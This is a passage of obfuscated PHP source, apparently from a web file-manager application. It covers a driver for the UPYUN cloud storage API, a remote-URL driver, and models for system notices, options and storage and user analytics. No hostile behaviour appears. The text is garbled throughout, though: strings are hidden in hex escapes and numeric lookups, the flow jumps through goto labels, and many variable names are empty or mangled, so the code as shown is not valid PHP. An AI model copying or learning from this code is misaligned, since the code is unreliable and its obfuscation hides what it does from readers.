$ț = $ۍ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ˣ, $ț); } if ($this->sourceType == self::TYPE_FILE) { if ($ț <= 0) { return $_SERVER[][12]; } $ = ftell($this->source); fseek_64($this->source, $ + $ˣ); $ = @fread($this->source, $ț); fseek_64($this->source, $); return $; } } public function hashMd5($ܞе = false) { return md5($this->getContent()); } public static function hash($͐, $ = 0) { $ĵ = new PathDriverStream($͐, $); return $ĵ->hashSimple($͐); } public static function md5($ǯ, $ = 0) { $ = new PathDriverStream($ǯ, $); return $->hashMd5($ǯ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\x2f\x2f\x76\60\x2e\x61\160\x69\56\x75\x70\x79\165\156\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($) { parent::__construct(); $this->_init($); } public function _init($) { $ˑ =& $_SERVER[]; foreach ($ as $ => $) { if (isset($this->{$})) { $this->{$} = $; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ˑ[1743] . LNG($ˑ[1666])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ә, $͸ = "\107\105\124") { $ =& $_SERVER[]; $Ͷ = gmdate($[1695]); $ = base64_encode(hash_hmac($[1744], "{$͸}\46{$Ә}\46{$Ͷ}", md5("{$this->userpass}"), !0)); $ܷ = array("\101\x75\x74\150\157\162\151\172\141\x74\x69\x6f\x6e\72\125\x50\x59\125\x4e\x20{$this->username}\x3a{$}", "\x44\141\164\x65\x3a{$Ͷ}"); return $ܷ; } public function ussRequest($ծ鎦, $력 = "\x47\105\124", $ɩ = false, $Ε = false, $ = false) { $ =& $_SERVER[]; $ծ鎦 = trim($ծ鎦, $[8]); $ݤ = "\x2f{$this->bucket}\57" . rawurlencode($ծ鎦); $ګ = $this->ussHeaders($ݤ, $력); if ($Ε) { $ګ = array_merge($ګ, $Ε); } $ћ = url_request($this->endpoint . $ݤ, $력, $ɩ, $ګ, $); if (!$ћ) { $ = LNG($[1745]); $this->writeLog($); return array($[1396] => !1, $[1386] => $); } if (strtolower($력) == $[227] || in_array($ћ[$[1396]], array($[261], $[1746]))) { $ɩ = $ћ[$[1747]]; if (!$ћ[$[844]]) { $ɩ = isset($ɩ[0]) ? $ɩ[0] : $[12]; } } else { $ɩ = json_decode($ћ[$[1386]], !0); if (!$ɩ) { $ɩ = $ћ[$[1386]]; } else { if (!$ћ[$[844]] && isset($ɩ[$[1748]])) { $ɩ = $ɩ[$[1748]]; } } } if (!$ћ[$[844]]) { $this->writeLog($this->__errorMessage($ɩ)); } return array($[1396] => $ћ[$[844]], $[1386] => $ɩ); } private function __errorMessage($) { $ =& $_SERVER[]; if (!$) { return $[12]; } static $Á = null; if (!$Á) { $Á = I18n::getType(); } if ($Á != $[1703]) { return $; } $ = array($[1749] => $[1750], $[1751] => $[1752], $[1753] => $[1752], $[1754] => $[1755], $[1756] => $[1757], $[1758] => $[1759], $[1760] => $[1761]); return isset($[$]) ? $[$] : $; } public function mkfile($, $ = '', $˭ = REPEAT_RENAME) { if ($this->setContent($, $)) { return $this->getPathOuter($); } return !1; } public function mkdir($ߡ, $󵍻 = REPEAT_SKIP) { $ӱ =& $_SERVER[]; $ = trim($ߡ, $ӱ[8]); if ($this->_isFolder($)) { return $this->getPathOuter($); } $滯 = array($ӱ[1762]); $ꇛ = $this->ussRequest($, $ӱ[288], !1, $滯); return $ꇛ[$ӱ[1396]] ? $this->getPathOuter($) : !1; } public function copyFile($Ǌ, $) { $֙ =& $_SERVER[]; $ = array($֙[1763] . "\x2f{$this->bucket}\x2f{$Ǌ}", $֙[1764]); $戈 = $this->ussRequest($, $֙[253], !1, $); return $戈[$֙[1396]] ? !0 : $this->getPathOuter($); } public function moveFile($˕ֺ, $ȿǇ) { $ =& $_SERVER[]; $󝚂 = array($[1765] . "\57{$this->bucket}\x2f{$˕ֺ}", $[1764]); $ = $this->ussRequest($ȿǇ, $[253], !1, $󝚂); return $[$[1396]] ? !0 : $this->getPathOuter($ȿǇ); } public function delFile($氟) { $ =& $_SERVER[]; $娧 = $this->ussRequest($氟, $[1766]); return $娧[$[1396]] ? !0 : !1; } public function delFolder($Ÿ) { $ =& $_SERVER[]; if (!$this->exist($Ÿ)) { return !0; } $this->listItemCache = !1; $ж = $ڹЃ = array(); $this->fileList($Ÿ, $ж, $ڹЃ, !0); $this->listItemCache = !0; foreach ($ڹЃ as $֧) { $ɽ = $this->ussRequest($֧[$[32]], $[1766]); if (!$ɽ[$[1396]]) { return !1; } } usort($ж, function ($, $˝ԟ) { $εӹ =& $_SERVER[]; return substr_count($˝ԟ, $εӹ[8]) - substr_count($, $εӹ[8]); }); foreach ($ж as $) { $ɽ = $this->ussRequest($, $[1766]); if (!$ɽ[$[1396]]) { return !1; } } $ɽ = $this->ussRequest($Ÿ, $[1766]); return $ɽ[$[1396]]; } public function rename($, $) { if ($this->isFile($)) { $ = get_path_father($) . $; return $this->moveFile($, $); } return $this->renameObject($, $); } public function fileInfo($ŕ, $ = false, $ = array()) { $ƽ =& $_SERVER[]; $ = array($ƽ[32] => $this->pathThis($ŕ), $ƽ[87] => $this->getPathOuter($ƽ[8] . $ŕ), $ƽ[33] => $ƽ[230], $ƽ[79] => isset($[$ƽ[79]]) ? $[$ƽ[79]] : 0, $ƽ[166] => $this->ext($ŕ)); if ($) { return $; } $[$ƽ[231]] = $[$ƽ[88]] = 0; $[$ƽ[232]] = $[$ƽ[233]] = !0; if (empty($)) { $ = $this->objectMeta($ŕ); if (!$) { return $; } } $[$ƽ[231]] = intval($[$ƽ[1767]]); $[$ƽ[88]] = intval($[$ƽ[1768]]); $[$ƽ[79]] = $[$ƽ[79]]; return $; } public function folderInfo($̝, $ = false) { $ɋ =& $_SERVER[]; $۲ = array($ɋ[32] => $this->pathThis($̝), $ɋ[87] => $this->getPathOuter($ɋ[8] . $̝), $ɋ[33] => $ɋ[78]); if ($) { return $۲; } $۲[$ɋ[231]] = $۲[$ɋ[88]] = 0; $۲[$ɋ[232]] = $۲[$ɋ[233]] = !0; if (empty($޳)) { $޳ = $this->objectMeta($̝); if (!$޳) { return $۲; } } $۲[$ɋ[231]] = intval($޳[$ɋ[1767]]); $۲[$ɋ[88]] = intval($޳[$ɋ[1768]]); return $۲; } private function listObjs($̛, $϶Յ = 0, $󪻦 = 1000) { $΁ =& $_SERVER[]; $ = array($΁[1769], $΁[1770] . $󪻦); if ($϶Յ) { $[] = $΁[1771] . $϶Յ; } $ = $this->ussRequest($̛, $΁[1599], !1, $); return !$[$΁[1396]] ? !1 : $[$΁[1386]]; } private function fileList($Ֆ, &$Ϛ, &$, $ǝ = false) { $愨ح =& $_SERVER[]; $ = $愨ح[12]; $요 = 1000; $Ώ = rtrim($Ֆ, $愨ح[8]) . $愨ح[8]; while (!0) { check_abort(); $ = $this->listObjs($Ֆ, $, $요); if (!$) { return !1; } $ = isset($[$愨ح[1772]]) ? $[$愨ح[1772]] : $愨ح[12]; $Ū = isset($[$愨ح[1773]]) ? $[$愨ح[1773]] : array(); foreach ($Ū as $۞) { $۵ݻ = $۞[$愨ح[33]] == $愨ح[78] ? !0 : !1; $ = ltrim($Ώ . $۞[$愨ح[32]], $愨ح[8]) . ($۵ݻ ? $愨ح[8] : $愨ح[12]); $Φ = array($愨ح[32] => $, $愨ح[33] => $۵ݻ ? $愨ح[78] : $愨ح[230], $愨ح[79] => $۞[$愨ح[412]], $愨ح[1768] => $۞[$愨ح[1774]]); $this->cacheMethodInfoSet($, $۵ݻ, $Φ); if ($۵ݻ) { $Ϛ[] = $; if ($ǝ) { $this->fileList($, $Ϛ, $, $ǝ); } continue; } $[] = $Φ; } if (count($Ū) < $요) { break; } } $this->cacheMethodInfoSet($Ֆ, !0); } public function listPath($ʵ, $ = false) { $ =& $_SERVER[]; $俭 = $څ = array(); $this->fileList($ʵ, $俭, $څ); foreach ($俭 as $ܹŸ => $) { $俭[$ܹŸ] = $this->folderInfo($, $); } foreach ($څ as $ܹŸ => $) { $څ[$ܹŸ] = $this->fileInfo($[$[32]], $, $); } return array($[85] => $俭, $[86] => $څ); } public function has($, $δ = false, $ = true) { $͎ =& $_SERVER[]; $ʵ׸ = $͎[12]; $陡α = 500; $ = 0; $ˠ۵ = 0; $ک = rtrim($, $͎[8]) . $͎[8]; while (!0) { check_abort(); $ = $this->listObjs($, $ʵ׸, $陡α); if (!$) { return !1; } $ʵ׸ = isset($[$͎[1772]]) ? $[$͎[1772]] : $͎[12]; $ = isset($[$͎[1773]]) ? $[$͎[1773]] : array(); if (empty($)) { break; } $ = array_filter($, function ($ڤ) { $ڡ =& $_SERVER[]; return $ڤ[$ڡ[33]] == $ڡ[78]; }); $ڄ = count($); $ = count($); $ξӾ = $ڄ - $; if ($δ) { $ˠ۵ += $; $ += $ξӾ; if ($ڄ < $陡α) { break; } continue; } if ($) { if ($ξӾ) { return !0; } } else { if ($) { return !0; } } if ($ڄ < $陡α) { break; } } if ($δ) { return array($͎[239] => $, $͎[240] => $ˠ۵); } return !1; } public function listAll($Ȋ) { $ =& $_SERVER[]; $ = $ = array(); $this->fileList($Ȋ, $, $, !0); $㶝 = array_to_keyvalue($, $[32]); foreach ($ as $) { if (is_string($)) { $㶝[$] = array($[79] => 0); } } return $this->listAllFiles($Ȋ, $㶝); } public function canRead($) { return $this->exist($) ? !0 : !1; } public function canWrite($ƛ) { return $this->exist($ƛ) ? !0 : !1; } public function getContent($ͩ) { return $this->fileSubstr($ͩ, 0, -1); } public function setContent($, $ = '') { $ў =& $_SERVER[]; if (!$) { $ϣ = $this->ussRequest($, $ў[288]); return $ϣ[$ў[1396]]; } $ = $this->tempFile($this->pathThis($)); file_put_contents($, $); if ($this->upload($, $)) { $this->tempFileRemve($); return !0; } return !1; } public function fileSubstr($, $, $ˀ) { $ =& $_SERVER[]; if (!($瞬 = $this->link($))) { return !1; } $ = !1; if ($ˀ > 0) { $꣊ = $ + $ˀ - 1; $ = array($[1598] . $ . $[476] . $꣊); } $ = url_request($瞬, $[1599], !1, $); return $[$[844]] ? $[$[1386]] : !1; } public function upload($ʊ, $䌸, $ = false, $ = REPEAT_REPLACE) { $ӛ =& $_SERVER[]; if (!$䌸 || !@file_exists($䌸)) { return !1; } $˥Ī = IO::size($䌸); if ($˥Ī <= 1024 * 1024 * 200) { $ = array($ӛ[1775] . $䌸); $ = $this->ussRequest($ʊ, $ӛ[253], $); return $[$ӛ[1396]] ? $this->getPathOuter($ʊ) : !1; } $ӵ = 1024 * 1024 * 10; $Ʒ = array($ӛ[1776], $ӛ[1777] . $˥Ī, $ӛ[1778], $ӛ[1779] . $ӵ); $ = $this->ussRequest($ʊ, $ӛ[253], !1, $Ʒ); if (!$[$ӛ[1396]]) { return !1; } $ = $[$ӛ[1386]]; $πǍ = 0; $ = $[$ӛ[1780]]; $ģ = fopen($䌸, $ӛ[1660]); if (!$ģ) { return !1; } do { $ = $[$ӛ[1781]]; fseek_64($ģ, $πǍ); $ = fread($ģ, $); $ܜ = 0; do { $ܜ++; $ = $this->uploadPart($ʊ, $, $); } while (!$ && $ܜ < 3); if (!$) { return !1; } $ = $[$ӛ[1780]]; $πǍ += $; } while ($ != -1); fclose($ģ); $Ʒ = array($ӛ[1782], $ӛ[1783] . $[$ӛ[1784]], $ӛ[1778]); $ = $this->ussRequest($ʊ, $ӛ[253], !1, $Ʒ); return $[$ӛ[1396]] ? $this->getPathOuter($) : !1; } private function uploadPart($, $ʬ, &$) { $֨ =& $_SERVER[]; $å = array($֨[1785], $֨[1783] . $ʬ[$֨[1784]], $֨[1786] . $ʬ[$֨[1780]], $֨[143] . $ʬ[$֨[1781]]); $̓ = $this->ussRequest($, $֨[253], $, $å); return !$̓[$֨[1396]] ? $̓[$֨[1396]] : $̓[$֨[1386]]; } public function uploadFormData($五, $ = 3600) { return $this->uploadPolicy($五, $); } public function uploadMultiData($, $֥ = 3600) { $ =& $_SERVER[]; $ = (int) $GLOBALS[$[7]][$[79]]; return $this->uploadPolicy($, $֥, $); } private function uploadPolicy($, $ڰå = 3600, $ = 0) { $߯ =& $_SERVER[]; $ = $߯[8] . $this->bucket; $״ = gmdate($߯[1695]); $ɑ = array($߯[1787] => $this->bucket, $߯[1788] => $, $߯[1789] => time() + $ڰå, $߯[1790] => $״); if ($) { $ɑ[$߯[1680]] = $; } $ = base64_encode(json_encode($ɑ)); $ج = base64_encode(hash_hmac($߯[1744], "\x50\x4f\x53\x54\x26{$}\x26{$״}\x26{$}", md5("{$this->userpass}"), !0)); $ה = array($߯[277] => $, $߯[1791] => "\x55\120\x59\125\x4e\40{$this->username}\72{$ج}", $߯[206] => $this->endpoint . $); return $ה; } public function download($𶊁, $θ؈) { $چ = IO::getPathInner(IO::mkfile($θ؈)); if (!($ = $this->link($𶊁))) { return !1; } $㯮 = 0; $ = 1024 * 200; $ց = fopen($چ, $_SERVER[][1739]); while (!0) { $ = $this->fileSubstr($𶊁, $㯮, $); if ($ === !1) { return !1; } fwrite($ց, $); $㯮 += $; if (strlen($) < $) { break; } } fclose($ց); return $θ؈; } public function link($, $ = array()) { $ =& $_SERVER[]; $ = trim($, $[8]); if (!empty($this->token)) { $ø = strtotime(date($[1792])); $Ռ = substr(md5($this->token . $[284] . $ø . $[1793] . $), 12, 8) . $ø; $[] = $[1794] . $Ռ; } $ = !empty($) ? $[76] . implode($[284], $) : $[12]; return $this->getHost() . $[8] . $this->pathEncode($) . $; } public function fileOut($Х, $ = false, $🼦 = false, $ϕٯ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Х, $, $🼦, $ϕٯ); } if (!$🼦) { $🼦 = $this->pathThis($Х); } $Ϻ = $ ? array($_SERVER[][1795] . rawurlencode($🼦)) : array(); $܍ = $this->link($Х, $Ϻ); $this->fileOutLink($܍); } public function fileOutServer($, $ҡ = false, $Ӂ = false, $ = '') { parent::fileOut($, $ҡ, $Ӂ, $); } public function fileOutImage($Ø, $١ = 250) { $ = $this->link($Ø . $_SERVER[][1796] . $١); $this->fileOutLink($); } public function fileOutImageServer($Ť死, $̧ = 250) { parent::fileOutImage($Ť死, $̧); } public function hashMd5($) { $ =& $_SERVER[]; $ = $this->_objectMeta($); return isset($[$[245]]) ? $[$[245]] : !1; } public function size($ƫ߷) { $ = $this->objectMeta($ƫ߷); return $ ? $[$_SERVER[][79]] : 0; } public function info($ە) { if ($this->isFolder($ە)) { return $this->folderInfo($ە); } else { if ($this->isFile($ە)) { return $this->fileInfo($ە); } } return !1; } public function exist($؂) { return $this->isFile($؂) || $this->isFolder($؂); } public function isFile($ڙ) { return !$this->isFolder($ڙ) && $this->objectMeta($ڙ); } public function isFolder($) { return $this->cacheMethod($_SERVER[][177], $); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[][179], $); } protected function _objectMeta($) { $Օ =& $_SERVER[]; if ($ == $Օ[12] || $ == $Օ[8]) { return array(); } $­ = $this->ussRequest($, $Օ[1797]); if (!$­[$Օ[1396]]) { return null; } $Ӣ = isset($­[$Օ[1386]]) ? $­[$Օ[1386]] : array(); if (!isset($Ӣ[$Օ[1798]])) { return null; } $ = array($Օ[33] => isset($Ӣ[$Օ[1798]]) ? $Ӣ[$Օ[1798]] : null, $Օ[79] => isset($Ӣ[$Օ[1799]]) ? $Ӣ[$Օ[1799]] : null, $Օ[245] => isset($Ӣ[$Օ[1800]]) ? $Ӣ[$Օ[1800]] : null, $Օ[1767] => isset($Ӣ[$Օ[1801]]) ? $Ӣ[$Օ[1801]] : null); $[$Օ[1768]] = isset($Ӣ[$Օ[1802]]) ? strtotime($Ӣ[$Օ[1802]]) : $[$Օ[1767]]; return $; } protected function _isFolder($) { $˨ =& $_SERVER[]; if ($ == $˨[12] || $ == $˨[8]) { return !0; } $ = $this->_objectMeta($); return isset($[$˨[33]]) && $[$˨[33]] == $˨[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ƍ = false) { } public function exist($ù) { $ = $this->info($ù); return $[$_SERVER[][232]]; } public function isFile($㞴) { $ꖪ = $this->info($㞴); return $ꖪ[$_SERVER[][232]]; } public function isFolder($) { return !1; } public function size($ɳ) { $Η = $this->info($ɳ); return $Η[$_SERVER[][79]]; } public function info($Φ) { return $this->infoParse($Φ); } public function infoAuth($) { return $this->infoParse($); } public function infoWithChildren($ۤ) { return $this->infoParse($ۤ); } public function infoFull($) { return $this->infoParse($); } private function infoParse($ޅ) { $숆 =& $_SERVER[]; $Г = $this->header($ޅ); if (!$Г || !$Г[$숆[844]]) { return !1; } $Ѷ = _get($Г, $숆[412], 0); $ = array($숆[32] => $Г[$숆[32]], $숆[87] => $ޅ, $숆[33] => $숆[230], $숆[79] => intval($Ѷ), $숆[166] => get_path_ext($Г[$숆[32]]), $숆[1657] => $Ѷ > 0 && $Г[$숆[1803]], $숆[1658] => !1); return $; } private function header($ꫬ) { $ә =& $_SERVER[]; if (isset(self::$_cacheHeader[$ꫬ])) { return self::$_cacheHeader[$ꫬ]; } $ = isset($GLOBALS[$ә[1804]]) ? $GLOBALS[$ә[1804]] : !1; $GLOBALS[$ә[1804]] = !0; self::$_cacheHeader[$ꫬ] = url_header($ꫬ); $GLOBALS[$ә[1804]] = $; return self::$_cacheHeader[$ꫬ]; } public function hashSimple($, $ = false) { $ =& $_SERVER[]; $ = $this->info($); if (!$ || !$[$[232]]) { return !1; } $ø = $[$[79]]; $ԫ = 200; $Ϻ׭ = 50; if ($ø <= $ԫ * $Ϻ׭) { return md5($this->fileSubstr($, 0, $ø)) . $ø; } $ը = intval($ø / $Ϻ׭); $ = $[12]; $ӽ = timeFloat(); $Ǿ۶ = 15; for ($۔ = 0; $۔ < $Ϻ׭; $۔++) { if (timeFloat() - $ӽ > $Ǿ۶) { return !1; } $ˎ = $this->fileSubstr($, $ը * $۔, $ԫ); if (!$ˎ) { return !1; } $ .= $ˎ; } $ .= $this->fileSubstr($, $ø - $ԫ, $ԫ); return md5($) . $ø; } public function getContent($) { return $this->fileSubstr($); } public function fileSubstr($, $ݼ = 0, $ = -1) { $ =& $_SERVER[]; $Ɲ = $this->info($); if (!$Ɲ || !$Ɲ[$[232]] && $Ɲ[$[79]] > 1024 * 1024 * 10) { return !1; } if ($ === -1) { $ = $Ɲ[$[79]]; } if ($ == 0) { return $[12]; } $鬆 = array($[1805] . $ݼ . $[882] . ($ݼ + $ - 1)); $޴і = url_request($, $[1599], !1, $鬆, !1, !1, 30); return $޴і[$[1386]] ? $޴і[$[1386]] : $[12]; } public function download($Ԕ, $ͽ) { Downloader::start($Ԕ, $ͽ); return $ͽ; } } goto f; dꂜ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\x6e\x6f\x74\x69\x63\x65\114\x69\x73\x74"; public $field = array("\156\141\155\x65", "\x63\x6f\x6e\164\145\x6e\x74", "\141\165\164\150", "\155\157\x64\145", "\164\151\x6d\145", "\x74\x79\160\145", "\154\145\x76\x65\154", "\145\x6e\x61\x62\154\145", "\x73\157\162\164"); public function listData($ = false, $ɻ = "\x73\157\162\x74", $ = false) { return parent::listData($, $ɻ, $); } public function add($) { $ =& $_SERVER[]; $ͥ = time(); if ($[$[16]] == $[2651]) { $ͥ = strtotime($[$[204]]); } $[$[204]] = $ͥ; return parent::insert($); } public function update($, $) { $ =& $_SERVER[]; $ = $this->listData($); if (!$) { return !1; } $ = time(); if ($[$[16]] == $[2651]) { $ = strtotime($[$[204]]); } $[$[204]] = $; return parent::update($, $); } public function remove($) { $ = $this->listData($); if (!$ || $[$_SERVER[][189]]) { return !1; } return parent::remove($); } public function sort($ڐ, $) { return parent::update($ڐ, $); } public function enable($݌, $帶) { return parent::update($݌, array($_SERVER[][2652] => $帶)); } private function initUserOption() { $׆ =& $_SERVER[]; $this->optionType = $׆[2653]; $this->modelType = $׆[2654]; $this->field = array($׆[2655], $׆[32], $׆[204], $׆[33], $׆[2656], $׆[844], $׆[226]); } public function userNoticeGet($ֹ = false) { $this->initUserOption(); return parent::listData($ֹ, $_SERVER[][487], !0); } public function userNoticeAdd($) { $ߚ =& $_SERVER[]; $this->initUserOption(); $ǥ = $this->findByKey($ߚ[2655], $[$ߚ[487]]); if ($ǥ) { return !0; } $ = array($ߚ[2655] => $[$ߚ[487]], $ߚ[32] => $[$ߚ[32]], $ߚ[204] => $[$ߚ[204]], $ߚ[33] => isset($[$ߚ[33]]) ? $[$ߚ[33]] : 1, $ߚ[2656] => isset($[$ߚ[2656]]) ? $[$ߚ[2656]] : 0, $ߚ[844] => 0, $ߚ[226] => 0); return parent::insert($); } public function userNoticeEdit($ٮ, $) { $this->initUserOption(); return parent::update($ٮ, $); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\x65\155\x5f\x6f\160\x74\x69\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\162\x6f\154\145", "\162\157\154\145\x47\162\x6f\x75\x70", "\x72\x65\147\x69\163\x74", "\x65\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($) { return "\x53\x79\x73\164\145\x6d\117\x70\x74\x69\x6f\x6e\x5f{$}"; } protected function optionDefault($ = '') { $ =& $_SERVER[]; if ($ == $[12]) { return $GLOBALS[$[6]][$[468]]; } } } class SystemRecordModel extends ModelBaseLight { } goto cѮ; B񊊧: class AnalysisModel extends ModelBaseLight { public function init($) { $ӗ =& $_SERVER[]; $ӛ = array($ӗ[684] => array($ӗ[33] => $ӗ[2107], $ӗ[351] => array($ӗ[282], $ӗ[860], $ӗ[2108], $ӗ[2109])), $ӗ[2110] => array($ӗ[33] => $ӗ[2111], $ӗ[351] => array($ӗ[282], $ӗ[858], $ӗ[2112], $ӗ[2113], $ӗ[2114]))); if (!isset($ӛ[$])) { return !1; } $this->optionType = $ӛ[$][$ӗ[33]]; $this->field = $ӛ[$][$ӗ[351]]; return !0; } public function listData($ء = false, $Ɓ = "\x6d\157\x64\151\146\x79\124\151\x6d\x65", $Ϻ = false) { return parent::listData($ء, $Ɓ, $Ϻ); } public function trendList($ס) { $Ə =& $_SERVER[]; $ס = $this->listData(); if ($ס) { $罿 = end($ס); $ = date($Ə[2115], strtotime($Ə[2116])); if ($罿[$Ə[282]] == $) { return $ס; } $ = strtotime($罿[$Ə[282]]); } if (!isset($)) { $ٹ = $ס == $Ə[684] ? $Ə[617] : $Ə[927]; $ = Model($ٹ)->min($Ə[231]); } $ = $Ə[2117] . ucfirst($ס); $Ӻ¶ = $this->dateList($); foreach ($Ӻ¶ as $) { $this->{$}($); } return $this->listData(); } private function dateList($ʚ) { $у̗ =& $_SERVER[]; $ = $ʚ; $ = strtotime($у̗[2116]); $˩ć = array(); while ($ <= $) { $˩ć[] = date($у̗[2115], $); $ = strtotime($у̗[2118], $); } return $˩ć; } public function _recordUser($ = '') { $Ӿ =& $_SERVER[]; if (!$) { return 0; } $ = strtotime(date($Ӿ[2119], strtotime($))); $澘 = strtotime(date($Ӿ[2120], strtotime($))); $ݲ = array($Ӿ[231] => array($Ӿ[1175], $澘)); $آܔ = Model($Ӿ[617])->where($ݲ)->count($Ӿ[1586]); $ݲ[$Ӿ[231]] = array($Ӿ[408], array($, $澘)); $Ȏ = Model($Ӿ[617])->where($ݲ)->count($Ӿ[1586]); $ݲ[$Ӿ[33]] = $Ӿ[2121]; $ո = Model($Ӿ[2122])->where($ݲ)->count($Ӿ[2123]); $ = array($Ӿ[282] => $, $Ӿ[860] => (int) $آܔ, $Ӿ[2108] => (int) $Ȏ, $Ӿ[2109] => (int) $ո); return $this->insert($); } public function _recordStore($ג = '') { $ύ =& $_SERVER[]; if (!$ג) { return 0; } $Შ٨ = strtotime(date($ύ[2120], strtotime($ג))); $ = array($ύ[231] => array($ύ[1175], $Შ٨)); $ϗœ = Model($ύ[560])->where($)->sum($ύ[79]); $빺 = "\x53\x45\114\105\x43\x54\x20\xa\40\40\40\40\40\x20\x20\x20\x20\40\x20\40\40\x20\x20\40\x53\125\115\x28\x60\x73\151\x7a\145\x60\51\40\x41\x53\40\x73\x69\x7a\x65\124\x6f\x74\141\154\x2c\12\40\x20\x20\x20\x20\40\x20\x20\40\x20\40\x20\40\x20\x20\40\x53\x55\x4d\x28\x43\x41\123\x45\40\x57\110\x45\x4e\x20\140\x74\x61\162\147\x65\164\124\x79\160\x65\x60\40\75\x20\x31\x20\124\x48\x45\116\x20\x60\x73\x69\x7a\x65\140\x20\105\x4c\123\x45\40\x30\40\105\116\104\x29\40\x41\123\x20\x73\151\x7a\x65\125\x73\145\162\x2c\12\x20\40\x20\x20\x20\x20\40\40\x20\40\x20\40\x20\40\40\40\123\125\115\x28\x43\101\x53\105\x20\x57\110\105\x4e\x20\140\164\141\x72\x67\x65\164\x54\x79\x70\x65\x60\40\75\x20\x32\x20\x54\x48\105\x4e\x20\x60\x73\151\172\145\x60\x20\105\x4c\123\105\x20\x30\x20\105\116\104\x29\40\101\123\40\x73\151\172\145\x47\x72\157\x75\x70\12\40\40\40\x20\x20\x20\40\x20\x20\x20\x20\40\x20\40\x20\x20\106\122\117\115\40\x60\x69\157\x5f\163\x6f\165\x72\143\x65\140\x20\12\x20\40\x20\40\40\x20\40\40\40\40\40\x20\40\40\x20\40\127\x48\105\122\105\x20\140\x69\x73\x46\x6f\154\144\x65\162\x60\x20\x3d\40\60\40\101\x4e\104\40\140\x63\162\145\x61\x74\x65\x54\x69\155\145\x60\40\74\75\x20{$Შ٨}"; $ = Model($ύ[927])->query($빺); $ۙ = array($ύ[282] => $ג, $ύ[858] => (int) (isset($[0][$ύ[858]]) ? $[0][$ύ[858]] : 0), $ύ[2112] => (int) $ϗœ, $ύ[2113] => (int) (isset($[0][$ύ[2113]]) ? $[0][$ύ[2113]] : 0), $ύ[2114] => (int) (isset($[0][$ύ[2114]]) ? $[0][$ύ[2114]] : 0)); return $this->insert($ۙ); } public function trend($狍, $Ӡ) { $ =& $_SERVER[]; if (!$this->init($狍)) { return !1; } $ = $this->trendList($狍); if ($ && $Ӡ != $[1943]) { $Ȱ = $[0][$[282]]; $ = $this->validDate($Ӡ, $Ȱ); $ݷ = array(); $㥰 = array_to_keyvalue($, $[282]); foreach ($ as $尤) { if (isset($㥰[$尤])) { $ٰ = $㥰[$尤]; } else { $ٰ = end($); $ٰ[$[282]] = $尤; if ($狍 == $[684]) { $ٰ[$[2108]] = $ٰ[$[2109]] = 0; } } $ݷ[] = $ٰ; } $ = $ݷ; } $֚ = array($[684] => array($[860] => LNG($[2124]), $[2108] => LNG($[2125]), $[2109] => LNG($[2126])), $[2110] => array($[858] => LNG($[2127]), $[2112] => LNG($[2128]), $[2113] => LNG($[2129]), $[2114] => LNG($[2130]))); $ٲ = array($[684] => $[944], $[2110] => $[79]); if (empty($)) { $尤 = date($[2115], strtotime($[2116])); $ = array($[282] => $尤); foreach ($֚[$狍] as $ => $) { $[$] = 0; } $[] = $; } $җ = array(); foreach ($ as $) { if ($狍 == $[2110] && $[$[2112]] > $[$[858]]) { $[$[2112]] = $[$[858]]; } foreach ($֚[$狍] as $ => $Ф) { $ٰ = array($[282] => $[$[282]], $[1859] => $Ф); $ٰ[$ٲ[$狍]] = isset($[$]) ? $[$] : 0; $җ[] = $ٰ; } } return $җ; } public function validDate($Ώ, $) { $ =& $_SERVER[]; $ = date($[2115], strtotime($[2116])); $߰ = array($); switch ($Ώ) { case $[1950]: $ = mktime(0, 0, 0, date($[2131]), date($[1653]) - date($[1739]) + 7 - 7, date($[2132])); $ = 0; do { $ = date($[2115], $ - 3600 * 24 * 7 * $); $߰[] = $; $++; } while ($ < $); break; case $[1948]: $ = 1; do { $ = date($[2133], strtotime("\55\40{$}\40\155\157\x6e\164\x68\x73")); $߰[] = $; $++; } while ($ < $); break; case $[2134]: $ = (int) date($[2132], strtotime($)); $ = (int) date($[2132]); if ($ >= $) { break; } for ($; $ < $; $++) { $߰[] = $ . $[2135]; } break; default: break; } if ($ > end($߰)) { array_pop($߰); } sort($߰); return $߰; } public function listTable($וО) { $ϒ = ucfirst($וО); return Model($ϒ)->listData(); } public function option($ߠǕ) { return call_user_func_array(array($this, $_SERVER[][2136] . ucfirst($ߠǕ)), array()); } private function optionUser() { $͆ =& $_SERVER[]; $ = Model($͆[617])->count($͆[1586]); $׻ = Model($͆[617])->where($͆[2137])->count($͆[1586]); $ = intval($GLOBALS[$͆[6]][$͆[424]][$͆[1917]]) / 3600; $ʻИ = strtotime("\55{$}\x20\x68\x6f\x75\x72\x73"); $Ӥ = strtotime(date($͆[2119])); if ($ʻИ < $Ӥ) { $ʻИ = $Ӥ; } $Ơ = array($͆[2138] => array($͆[1176], $ʻИ)); $ = (int) Model($͆[617])->where($Ơ)->count($͆[1586]); if (!$) { $ = 1; } $Ơ = array($͆[2138] => array($͆[1176], $Ӥ)); $ = Model($͆[617])->where($Ơ)->count($͆[1586]); return array($͆[853] => (int) $, $͆[2139] => (int) ($ - $׻), $͆[2140] => (int) $׻, $͆[2141] => (int) $, $͆[2142] => $); } private function optionFile() { $㙼 =& $_SERVER[]; $ŉ靖 = $this->sourceSize(); $ח␃ = array($㙼[500] => 0); $ = Model($㙼[927])->where($ח␃)->count(); $ח␃[$㙼[231]] = array($㙼[1176], strtotime(date($㙼[2119]))); $ = Model($㙼[927])->where($ח␃)->field(array($㙼[943] => $㙼[944], $㙼[945] => $㙼[79]))->find(); $ = array($㙼[858] => $ŉ靖[$㙼[79]], $㙼[2112] => $ŉ靖[$㙼[2112]], $㙼[2143] => $ŉ靖[$㙼[79]] - 